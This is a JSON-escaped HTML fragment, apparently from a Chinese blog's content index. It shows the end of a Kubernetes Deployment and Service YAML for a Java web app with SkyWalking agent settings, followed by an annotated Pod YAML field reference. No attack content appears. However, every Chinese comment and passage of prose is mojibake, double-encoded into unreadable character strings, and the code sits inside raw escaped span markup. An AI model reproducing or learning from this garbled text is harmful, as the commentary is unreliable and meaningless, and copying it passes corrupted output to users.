class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eresources\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e# ç¬¬å››ç‚¹ï¼šè®¾ç½®èµ„æºé™åˆ¶ï¼Œå¦‚æœæ˜¯javaç¨‹åºï¼Œå»ºè®®limitæ¯”requestå¤§ï¼Œè¿™æ ·å¯ä»¥åˆç†åˆ†é…å †å†…å­˜å’Œéå †å†…å­˜\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003erequests\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e1024Mi\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003elimits\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e2048Mi\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eweb-port\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainerPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e8889\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e# ç¬¬äº”ç‚¹ï¼šè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®¾ç½®æ—¶åŒºï¼ŒæŒ‡å®šEVNç¯å¢ƒï¼Œæ·»åŠ JAVAå‚æ•°ç­‰\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eJVM_OPTS\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e-\u003cspan class=\"l\"\u003ejavaagent:/opt/skywalking/skywalking-agent.jar -Xmx1G -Xms1G\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eTZ\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eAsia/Shanghai\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eAPOLLO_LABEL\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003egray\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eSW_AGENT_NAME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;k8s-java-web\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eSW_AGENT_COLLECTOR_BACKEND_SERVICES\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;10.0.0.123:11800\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eENV\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eprod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nn\"\u003e---\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ev1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eService\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enamespace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eops\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web-port\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e8889\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eTCP\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003etargetPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e8889\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003enodePort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e30009\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003esessionAffinity\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eNone\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eNodePort\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003estatus\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eloadBalancer\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e{}\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢å¿½ç•¥äº†å¯åŠ¨å‘½ä»¤ï¼Œå…¶å®å®¹å™¨å†…çš„å¯åŠ¨å‘½ä»¤ä¹Ÿæ˜¯å¾ˆæœ‰å­¦é—®çš„ã€‚\u003c/p\u003e","title":"Javaä¸šåŠ¡ä¸Škubernetesçš„æ³¨æ„ç‚¹"},{"content":"Podçš„yamlæ–‡ä»¶çš„èµ„æºæ¸…å•å’Œè§£é‡Šï¼Œå¤‡æŸ¥ apiVersion: v1 #å¿…é€‰ï¼Œç‰ˆæœ¬å·ï¼Œä¾‹å¦‚v1 kind: Pod #å¿…é€‰ï¼Œèµ„æºç±»å‹ï¼Œä¾‹å¦‚ Pod metadata: #å¿…é€‰ï¼Œå…ƒæ•°æ® name: string #å¿…é€‰ï¼ŒPodåç§° namespace: string #Podæ‰€å±çš„å‘½åç©ºé—´,é»˜è®¤ä¸º\u0026#34;default\u0026#34; labels: #è‡ªå®šä¹‰æ ‡ç­¾åˆ—è¡¨ - name: string spec: #å¿…é€‰ï¼ŒPodä¸­å®¹å™¨çš„è¯¦ç»†å®šä¹‰ containers: #å¿…é€‰ï¼ŒPodä¸­å®¹å™¨åˆ—è¡¨ - name: string #å¿…é€‰ï¼Œå®¹å™¨åç§° image: string #å¿…é€‰ï¼Œå®¹å™¨çš„é•œåƒåç§° imagePullPolicy: [ Always|Never|IfNotPresent ] #è·å–é•œåƒçš„ç­–ç•¥ command: [string] #å®¹å™¨çš„å¯åŠ¨å‘½ä»¤åˆ—è¡¨ï¼Œå¦‚ä¸æŒ‡å®šï¼Œä½¿ç”¨æ‰“åŒ…æ—¶ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤ args: [string] #å®¹å™¨çš„å¯åŠ¨å‘½ä»¤å‚æ•°åˆ—è¡¨ workingDir: string #å®¹å™¨çš„å·¥ä½œç›®å½• volumeMounts: #æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨çš„å­˜å‚¨å·é…ç½® - name: string #å¼•ç”¨podå®šä¹‰çš„å…±äº«å­˜å‚¨å·çš„åç§°ï¼Œéœ€ç”¨volumes[]éƒ¨åˆ†å®šä¹‰çš„çš„å·å mountPath: string #å­˜å‚¨å·åœ¨å®¹å™¨å†…mountçš„ç»å¯¹è·¯å¾„ï¼Œåº”å°‘äº512å­—ç¬¦ readOnly: boolean #æ˜¯å¦ä¸ºåªè¯»æ¨¡å¼ ports: #éœ€è¦æš´éœ²çš„ç«¯å£åº“å·åˆ—è¡¨ - name: string #ç«¯å£çš„åç§° containerPort: int #å®¹å™¨éœ€è¦ç›‘å¬çš„ç«¯å£å· hostPort: int #å®¹å™¨æ‰€åœ¨ä¸»æœºéœ€è¦ç›‘å¬çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸Containerç›¸åŒ protocol: string #ç«¯å£åè®®ï¼Œæ”¯æŒTCPå’ŒUDPï¼Œé»˜è®¤TCP env: #å®¹å™¨è¿è¡Œå‰éœ€è®¾ç½®çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ - name: string #ç¯å¢ƒå˜é‡åç§° value: string #ç¯å¢ƒå˜é‡çš„å€¼ resources: #èµ„æºé™åˆ¶å’Œè¯·æ±‚çš„è®¾ç½® limits: #èµ„æºé™åˆ¶çš„è®¾ç½® cpu: string #Cpuçš„é™åˆ¶ï¼Œå•ä½ä¸ºcoreæ•°ï¼Œå°†ç”¨äºdocker run --cpu-shareså‚æ•° memory: string #å†…å­˜é™åˆ¶ï¼Œå•ä½å¯ä»¥ä¸ºMib/Gibï¼Œå°†ç”¨äºdocker run --memoryå‚æ•° requests: #èµ„æºè¯·æ±‚çš„è®¾ç½® cpu: string #Cpuè¯·æ±‚ï¼Œå®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡ memory: string #å†…å­˜è¯·æ±‚,å®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡ lifecycle: #ç”Ÿå‘½å‘¨æœŸé’©å­ postStart: #å®¹å™¨å¯åŠ¨åç«‹å³æ‰§è¡Œæ­¤é’©å­,å¦‚æœæ‰§è¡Œå¤±è´¥,ä¼šæ ¹æ®é‡å¯ç­–ç•¥è¿›è¡Œé‡å¯ preStop: #å®¹å™¨ç»ˆæ­¢å‰æ‰§è¡Œæ­¤é’©å­,æ— è®ºç»“æœå¦‚ä½•,å®¹å™¨éƒ½ä¼šç»ˆæ­¢ livenessProbe: #å¯¹Podå†…å„å®¹å™¨å¥åº·æ£€æŸ¥çš„è®¾ç½®ï¼Œå½“æ¢æµ‹æ— å“åº”å‡ æ¬¡åå°†è‡ªåŠ¨é‡å¯è¯¥å®¹å™¨ exec: #å¯¹Podå®¹å™¨å†…æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºexecæ–¹å¼ command: [string] #execæ–¹å¼éœ€è¦åˆ¶å®šçš„å‘½ä»¤æˆ–è„šæœ¬ httpGet: #å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹æ³•è®¾ç½®ä¸ºHttpGetï¼Œéœ€è¦åˆ¶å®šPathã€port path: string port: number host: string scheme: string HttpHeaders: - name: string value: string tcpSocket: #å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºtcpSocketæ–¹å¼ port: number initialDelaySeconds: 0 #å®¹å™¨å¯åŠ¨å®Œæˆåé¦–æ¬¡æ¢æµ‹çš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ timeoutSeconds: 0 #å¯¹å®¹å™¨å¥åº·æ£€æŸ¥æ¢æµ‹ç­‰å¾…å“åº”çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤1ç§’ periodSeconds: 0 #å¯¹å®¹å™¨ç›‘æ§æ£€æŸ¥çš„å®šæœŸæ¢æµ‹æ—¶é—´è®¾ç½®ï¼Œå•ä½ç§’ï¼Œé»˜è®¤10ç§’ä¸€æ¬¡ successThreshold: 0 failureThreshold: 0 securityContext: privileged: false restartPolicy: [Always | Never | OnFailure] #Podçš„é‡å¯ç­–ç•¥ nodeName: \u0026lt;string\u0026gt; #è®¾ç½®NodeNameè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°æŒ‡å®šåˆ°åç§°çš„nodeèŠ‚ç‚¹ä¸Š nodeSelector: obeject #è®¾ç½®NodeSelectorè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°åŒ…å«è¿™ä¸ªlabelçš„nodeä¸Š imagePullSecrets: #Pullé•œåƒæ—¶ä½¿ç”¨çš„secretåç§°ï¼Œä»¥keyï¼šsecretkeyæ ¼å¼æŒ‡å®š - name: string hostNetwork: false #æ˜¯å¦ä½¿ç”¨ä¸»æœºç½‘ç»œæ¨¡å¼ï¼Œé»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºä½¿ç”¨å®¿ä¸»æœºç½‘ç»œ volumes: #åœ¨è¯¥podä¸Šå®šä¹‰å…±äº«å­˜å‚¨å·åˆ—è¡¨ - name: string #å…±äº«å­˜å‚¨å·åç§° ï¼ˆvolumesç±»å‹æœ‰å¾ˆå¤šç§ï¼‰ emptyDir: {} #ç±»å‹ä¸ºemtyDirçš„å­˜å‚¨å·ï¼Œä¸PodåŒç”Ÿå‘½å‘¨æœŸçš„ä¸€ä¸ªä¸´æ—¶ç›®å½•ã€‚ä¸ºç©ºå€¼ hostPath: string #ç±»å‹ä¸ºhostPathçš„å­˜å‚¨å·ï¼Œè¡¨ç¤ºæŒ‚è½½Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½• path: string #Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½•ï¼Œå°†è¢«ç”¨äºåŒæœŸä¸­mountçš„ç›®å½• secret: #ç±»å‹ä¸ºsecretçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é›†ç¾¤ä¸å®šä¹‰çš„secretå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨ scretname: string items: - key: string path: string configMap: #ç±»å‹ä¸ºconfigMapçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é¢„å®šä¹‰çš„configMapå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨ name: string items: - key: string path: string åœ¨kubernetesä¸­åŸºæœ¬æ‰€æœ‰èµ„æºçš„ä¸€çº§å±æ€§éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸»è¦åŒ…å«5éƒ¨åˆ†ï¼š\napiVersion ç‰ˆæœ¬ï¼Œç”±kuberneteså†…éƒ¨å®šä¹‰ï¼Œç‰ˆæœ¬å·å¿…é¡»å¯ä»¥ç”¨ kubectl api-versions æŸ¥è¯¢åˆ° kind ç±»å‹ï¼Œç”±kuberneteså†…éƒ¨å®šä¹‰ï¼Œç‰ˆæœ¬å·å¿…é¡»å¯ä»¥ç”¨ kubectl api-resources æŸ¥è¯¢åˆ° metadata å…ƒæ•°æ®ï¼Œä¸»è¦æ˜¯èµ„æºæ ‡è¯†å’Œè¯´æ˜ï¼Œå¸¸ç”¨çš„æœ‰nameã€namespaceã€labelsç­‰ spec æè¿°ï¼Œè¿™æ˜¯é…ç½®ä¸­æœ€é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œé‡Œé¢æ˜¯å¯¹å„ç§èµ„æºé…ç½®çš„è¯¦ç»†æè¿° status çŠ¶æ€ä¿¡æ¯ï¼Œé‡Œé¢çš„å†…å®¹ä¸éœ€è¦å®šä¹‰ï¼Œç”±kubernetesè‡ªåŠ¨ç”Ÿæˆ specæè¿°æ˜¯ä¸»è¦å…³æ³¨çš„ï¼š\ncontainers \u0026lt;[]Object\u0026gt; å®¹å™¨åˆ—è¡¨ï¼Œç”¨äºå®šä¹‰å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯ nodeName æ ¹æ®nodeNameçš„å€¼å°†podè°ƒåº¦åˆ°æŒ‡å®šçš„NodeèŠ‚ç‚¹ä¸Š nodeSelector \u0026lt;map[]\u0026gt; æ ¹æ®NodeSelectorä¸­å®šä¹‰çš„ä¿¡æ¯é€‰æ‹©å°†è¯¥Podè°ƒåº¦åˆ°åŒ…å«è¿™äº›labelçš„Node ä¸Š 